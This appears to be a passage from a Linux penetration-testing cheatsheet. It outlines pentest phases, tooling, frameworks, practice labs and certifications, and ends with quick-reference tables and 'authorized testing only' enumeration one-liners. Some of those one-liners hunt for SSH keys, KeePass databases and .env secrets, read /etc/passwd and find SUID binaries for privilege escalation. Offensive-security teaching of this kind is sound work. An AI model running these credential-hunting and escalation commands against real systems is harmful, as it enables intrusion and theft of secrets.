**Phase 2: Reconnaissance (passive).** Gather info without touching the target.
- WHOIS, DNS, subdomain enumeration
- Search engines, GitHub for leaked secrets, archived sites (`web.archive.org`)
- LinkedIn for people, then guessable email formats
- Tools: `amass`, `subfinder`, `theharvester`, `shodan`, `crt.sh`

**Phase 3: Scanning and enumeration (active).** Touch the target, identify services and versions.
- Port scanning: `nmap -sC -sV -p- target`
- Web fingerprinting: `whatweb`, `wappalyzer`, manual browser inspection
- Directory brute force: `ffuf`, `gobuster`, `feroxbuster` against discovered web roots
- Service-specific enumeration: `enum4linux` for SMB, `snmp-check`, `smbclient`, etc.

**Phase 4: Exploitation.** Turn vulnerabilities into access.
- Public exploits: `searchsploit` (offline ExploitDB), `metasploit`, GitHub
- Web app: Burp Suite, `sqlmap`, manual fuzzing
- Credential attacks: `hydra`, `john`, `hashcat` (offline only)
- Custom: writing your own when the off-the-shelf doesn't fit. This is where seniors are made.

**Phase 5: Post-exploitation.** What you do *after* getting in.
- **Local enumeration**: `linpeas.sh`, `LinEnum.sh`, `pspy` on Linux. `winpeas`, `seatbelt`, `bloodhound` on Windows.
- **Privilege escalation**: SUID, sudo misconfig, kernel exploits (last resort), credential reuse.
- **Lateral movement**: SSH key reuse, pass-the-hash, kerberoasting, exploiting trust relationships.
- **Persistence (if in scope)**: cron, systemd units, SSH authorized_keys, web shells.
- **Data identification**: find the actual sensitive data ("crown jewels"). Demonstrate impact, don't just demonstrate access.

**Phase 6: Reporting.** This is where pentests become valuable or worthless.

The report is the deliverable. A finding the client can't act on is worthless. A finding without proof is unbelievable. The structure that works:

1. **Executive summary** (non-technical, 1-2 pages, business risk language)
2. **Scope and methodology** (what was tested, how, when)
3. **Findings**, each with:
   - Title, severity (CVSS), affected assets
   - Description of the vulnerability
   - Reproduction steps with screenshots/commands
   - Impact (what can an attacker do with this?)
   - Remediation guidance (specific, not "patch your stuff")
4. **Appendices** (raw scan data, tool output, references)

The CVSS score gives a number. The narrative gives the *meaning*. Junior pentesters submit scans. Senior pentesters submit stories with evidence.

### 10.4 The Tooling Map

You don't need to memorize every tool. You need to know which category solves which problem.

| Category | Tools | When to use |
|---|---|---|
| **Recon (passive)** | amass, subfinder, theharvester, shodan, crt.sh, github-dorking | Pre-engagement, scoping |
| **Recon (active)** | nmap, masscan, rustscan | Discover live hosts and services |
| **Web enumeration** | ffuf, gobuster, feroxbuster, wfuzz, dirb | Find hidden paths, parameters |
| **Web testing** | Burp Suite (Community / Pro), OWASP ZAP, mitmproxy | Intercepting and modifying HTTP |
| **Web exploitation** | sqlmap, XSStrike, commix, nikto | Specific class exploitation |
| **Wireless** | aircrack-ng, kismet, hcxdumptool | WiFi audits |
| **Password attacks (online)** | hydra, medusa, ncrack | Authenticated services |
| **Password attacks (offline)** | hashcat, john the ripper | Cracking captured hashes |
| **Exploitation framework** | Metasploit, Sliver, Cobalt Strike (commercial), Mythic | Payload delivery, C2 |
| **Linux post-ex** | linpeas, LinEnum, pspy, GTFOBins | Local privesc |
| **Windows post-ex** | winpeas, seatbelt, bloodhound, mimikatz, rubeus | AD attacks |
| **C2 / persistence** | Sliver, Mythic, Empire (legacy) | Long-haul access during red teams |
| **Pivoting** | chisel, ligolo-ng, ssh tunnels, proxychains | Reaching internal networks |
| **Forensics / DFIR** | volatility, autopsy, sleuthkit | Incident response side |

**Kali Linux** is the standard pentest distribution. **Parrot OS** is the alternative. They are not magic. They are Debian with the tools preinstalled. You can build your own with `apt` on any Ubuntu box.

### 10.5 Frameworks Worth Knowing By Name

Clients and employers will name-drop these. You should be able to nod intelligently.

- **MITRE ATT&CK**: a knowledge base of adversary tactics and techniques. Every modern detection engineering and red team conversation references "T1059.004" style technique IDs. Bookmark `attack.mitre.org`.
- **OWASP Top 10**: the ten most common web app vulnerability categories. Updated every few years. Your baseline for web testing.
- **OWASP Testing Guide**: longer-form testing methodology for web apps.
- **CWE** (Common Weakness Enumeration): catalog of software weakness types ("CWE-89: SQL Injection").
- **CVE** (Common Vulnerabilities and Exposures): identifiers for specific known vulnerabilities ("CVE-2021-44228" is Log4Shell).
- **CVSS** (Common Vulnerability Scoring System): the 0.0 to 10.0 severity score on findings. Currently CVSS v3.1, with v4.0 rolling out.
- **NIST SP 800-115**: US government technical guide to security testing.
- **PCI DSS, HIPAA, SOC 2**: compliance frameworks you may be testing *for*. Different scopes, different priorities.
- **The Cyber Kill Chain** (Lockheed Martin): an older but still cited model of attack stages. Recon, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives.

### 10.6 Note-Taking and Evidence Discipline

A pentest generates hundreds of commands and outputs. If you can't reproduce a finding two weeks later when the report is being reviewed, the finding might as well not exist.

**Practical setup:**
- **CherryTree, Obsidian, or Joplin** for hierarchical notes per host.
- **A scripted command logger** (`script` command, `tmux logging`, or a wrapper like `pentest-log`).
- **Screenshots immediately** when something interesting happens. Browser, terminal, scanner. Timestamp them.
- **One folder per target** with subfolders for `recon/`, `exploitation/`, `post-ex/`, `loot/`.
- **A running findings list** that you update as you go, not at the end.

The senior trick: at the end of each day, write a one-paragraph summary of what you tried, what worked, what didn't. Future-you reading this on report day will be grateful.

### 10.7 Practice Environments

You cannot get good at this from reading. The skill is hands-on.

| Platform | Best for |
|---|---|
| **TryHackMe** | Beginners. Guided rooms, gentle ramp. |
| **HackTheBox** | Intermediate to advanced. Less hand-holding. Active and retired machines. |
| **HackTheBox Academy** | Structured paths with quizzes and certs. |
| **PortSwigger Web Security Academy** | The gold standard for web app skills. Free. |
| **OverTheWire (Bandit, etc.)** | Pure Linux command line skill building. Start here for shell fluency. |
| **VulnHub** | Downloadable VMs to attack on your own LAN. |
| **PicoCTF** | Free, beginner-friendly CTFs from Carnegie Mellon. |
| **PentesterLab** | Web vulnerabilities with explanation depth. |
| **Root-Me** | Huge variety of challenges. |

**Build your own home lab.** A second machine running VMs (Proxmox, ESXi, or just VirtualBox) with intentionally vulnerable targets like Metasploitable, DVWA, OWASP Juice Shop, and a small AD lab (one DC, two member servers, a few users) teaches more than any course.

### 10.8 Certifications (The Credential Map)

The pentest certification market is dense. Here is the honest version.

**Beginner / Entry:**
- **CompTIA Security+**: vendor-neutral baseline. HR filters love it. Not a pentest cert specifically, but it opens doors.
- **eJPT (eLearnSecurity Junior Penetration Tester)**: practical, affordable, hands-on. Solid first pentest cert.

**Intermediate (these are the ones that get pentest jobs):**
- **PNPT (Practical Network Penetration Tester)**: by TCM Security. Affordable, modern, includes a real report deliverable. Highly respected.
- **OSCP (Offensive Security Certified Professional)**: still the most recognized name in the industry. 24-hour practical exam, then 24 hours to write the report. Brutal and rewarding. The "Try Harder" cert.
- **CRTP / CRTE (Certified Red Team Professional / Expert)**: by Altered Security. Active Directory focused. Excellent for the AD exploitation skill set.
- **BSCP (Burp Suite Certified Practitioner)**: by PortSwigger. The web app cert that actually proves web app skill.

**Advanced:**
- **OSEP (Offensive Security Experienced Penetration Tester)**: evasion and modern AD attacks.
- **OSWE (Offensive Security Web Expert)**: white-box web app security.
- **OSED (Exploit Development)**: Windows binary exploitation.
- **CRTO (Certified Red Team Operator)**: by Zero Point Security. Cobalt Strike focused, very current.

**Skip or deprioritize:**
- **CEH**: passes HR filters, derided technically. If your employer requires it for compliance, fine. Don't pay for it otherwise.

The pattern: **if the cert has a hands-on exam, it has signal. If it's only multiple choice, it's mostly an HR token.**

### 10.9 The Mindset Shift

Pentesters describe their work as "thinking like an attacker." The more accurate description is **thinking like a system that's been lied to.**

Every input is suspicious. Every assumption the developer made is a potential vulnerability if the assumption isn't enforced. Every trust boundary is an attack surface. Every "this isn't reachable from the internet" is provably false until you've checked.

Three habits that separate good pentesters from great ones:

1. **Read the source when you can.** White box findings are deeper than black box findings. Understanding the code reveals classes of bugs that would never show up in a scan.
2. **Chain low-severity findings.** Three "informational" findings can combine into a critical. The skill is seeing the chain.
3. **Demonstrate business impact.** "I got a shell" is a starting point. "I got a shell and from there reached the domain controller and from there read the customer database" is a finding that gets fixed.

### 🎯 Where this cheatsheet fits

Every section above (1 through 9) is something you will use in nearly every Linux pentest engagement. Reading files is recon. sudo and SUID are privesc. Permissions audits are post-ex. Network commands are recon and pivoting. Scripts are persistence and automation. Identifying user types is the AD-equivalent on Linux. The fluency you build with these primitives is the difference between staring at a shell prompt wondering what to type next, and seeing the system the way an attacker does, naturally.

---

## 11. Quick Reference Tables

### File operations

| Goal | Command |
|---|---|
| Show file contents | `cat`, `less`, `head`, `tail` |
| Identify file type | `file` |
| Find printable text in binary | `strings` |
| Hex dump | `xxd`, `hexdump -C` |
| Create empty file | `touch` |
| Make directory | `mkdir -p` |
| Copy | `cp -r` |
| Move/rename | `mv` |
| Delete | `rm -r`, `rmdir` |
| Securely wipe | `shred -uvz` |
| Hard / symbolic link | `ln`, `ln -s` |

### Permissions / ownership

| Goal | Command |
|---|---|
| View permissions | `ls -l`, `stat` |
| Change permissions | `chmod 644 file`, `chmod u+x file` |
| Change owner | `chown user:group file` |
| Default new-file perms | `umask` |
| Find SUID binaries | `find / -perm -4000 -type f 2>/dev/null` |
| Find world-writable | `find / -perm -o=w 2>/dev/null` |
| List ACLs | `getfacl file` |

### Search & extract

| Goal | Command |
|---|---|
| Find files by name | `find / -name "pattern"` |
| Find files by perms | `find / -perm -4000` |
| Search inside files | `grep -rni "term" /path` |
| Replace in file | `sed -i 's/old/new/g' file` |
| Extract column | `awk '{print $1}'` or `cut -d: -f1` |
| Frequency count | `sort \| uniq -c \| sort -rn` |

### Users & privilege

| Goal | Command |
|---|---|
| Who am I | `id`, `whoami` |
| Switch user | `su - user` |
| Run as root | `sudo cmd` |
| List my sudo rights | `sudo -l` |
| Add user | `sudo useradd -m -s /bin/bash name` |
| Add to group | `sudo usermod -aG group user` |
| List logins | `last`, `w`, `who` |

### Network

| Goal | Command |
|---|---|
| Show IPs | `ip a` |
| Show routes | `ip route` |
| Listening ports | `ss -tulnp` |
| Active connections | `ss -tnp` |
| DNS query | `dig example.com` |
| HTTP request | `curl -sL url` |
| Download | `wget url` |
| SSH tunnel (local) | `ssh -L 8080:host:80 user@gw` |
| SOCKS proxy | `ssh -D 1080 user@gw` |

### Pen test phase quick map

| Phase | Primary commands and tools |
|---|---|
| Recon (passive) | `whois`, `dig`, `amass`, `subfinder`, `crt.sh`, `theharvester` |
| Recon (active) | `nmap`, `masscan`, `ffuf`, `gobuster` |
| Exploitation | `searchsploit`, `metasploit`, Burp Suite, `sqlmap`, `hydra` |
| Initial enumeration on shell | `id`, `sudo -l`, `uname -a`, `ps auxf`, `ss -tulnp`, `cat /etc/passwd` |
| Local privesc | `linpeas.sh`, `find / -perm -4000`, `cat /etc/crontab`, GTFOBins |
| Pivoting | `ssh -D 1080`, `chisel`, `ligolo-ng`, `proxychains` |
| Cracking | `hashcat`, `john`, `rockyou.txt` |

### Useful enumeration one-liners (for authorized testing only)

```bash
# Who am I and what can I do?
id; sudo -l 2>/dev/null

# What's running and listening?
ps auxf; ss -tulnp 2>/dev/null

# What can I read that I shouldn't?
find / -name "id_rsa" 2>/dev/null
find / -name "*.kdbx" 2>/dev/null
find / -name ".env" 2>/dev/null

# What's SUID?
find / -perm -4000 -type f 2>/dev/null

# What's writable as me?
find / -writable -type d 2>/dev/null | grep -vE "^/(proc|sys)"

# Cron jobs?
cat /etc/crontab; ls -la /etc/cron.*

# Kernel and distro version (for kernel exploit search)
uname -a; cat /etc/os-release
```

---

## 🛡️ Closing Thought: Why Linux Fluency Is Non-Negotiable for Security Work

Every major attack pattern, from initial access to persistence to lateral movement to exfiltration, is *expressed* in these primitives. A web RCE is just remote `bash`. A privesc is just `chmod` or `sudo` you weren't supposed to have. Persistence is just `cron` or a service unit. Exfiltration is just `curl` or `scp`.

If you can read `ls -l` fluently, you can read an attacker's tracks. If you can write a 20-line bash script with `set -euo pipefail`, you can write a hardening script. The defenders who win are the ones who think in the same primitives the attackers use.

> *Don't memorize commands. Memorize the questions they answer. The shell is just the language those questions are spoken in.*

---

## 📚 Going Deeper

- [GTFOBins](https://gtfobins.github.io): privesc via misused binaries
- [LOLBAS](https://lolbas-project.github.io): Windows equivalent
- [HackTricks](https://book.hacktricks.xyz): encyclopedic pentest reference
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): payload catalog
- [PortSwigger Web Security Academy](https://portswigger.net/web-security): free web pentest course
- [MITRE ATT&CK](https://attack.mitre.org): adversary tactics knowledge base
- [PTES](http://www.pentest-standard.org): the methodology standard
- `man hier`: the canonical filesystem hierarchy man page
- `man 7 capabilities`: modern fine-grained alternative to SUID

---

*Made with ☕ and a healthy paranoia. Test only on systems you own or have written permission to assess.*
